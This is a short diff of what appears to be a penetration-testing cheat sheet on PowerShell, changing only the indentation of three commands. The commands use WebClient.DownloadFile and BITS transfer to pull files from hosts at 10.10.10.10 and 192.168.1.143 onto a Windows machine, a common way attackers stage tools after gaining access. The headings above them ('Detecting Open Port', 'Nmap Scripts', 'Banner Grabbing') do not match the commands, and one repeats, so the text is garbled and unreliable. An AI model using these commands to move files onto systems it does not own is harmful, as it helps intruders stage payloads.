@@ -4,15 +4,15 @@ USING POWERSHELL -
 
 #### Detecting Open Port
 	
-     powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\demo.txt')
+powershell.exe -c (new-object System.Net.WebClient).DownloadFile('http://10.10.10.10/demo.txt','c:\demo.txt')
 
 **Nmap Scripts**
 
-       powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://192.168.1.143/1.txt' -Destination 'c:\temp\1.txt'"
+powershell.exe -c "Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://192.168.1.143/1.txt' -Destination 'c:\temp\1.txt'"
 
 **Banner Grabbing**
 	
-        $webClient.DownloadFile('http://192.168.1.143:80/1.txt','c:\temp\1.txt')
+$webClient.DownloadFile('http://192.168.1.143:80/1.txt','c:\temp\1.txt')
 
 **Banner Grabbing**
 	
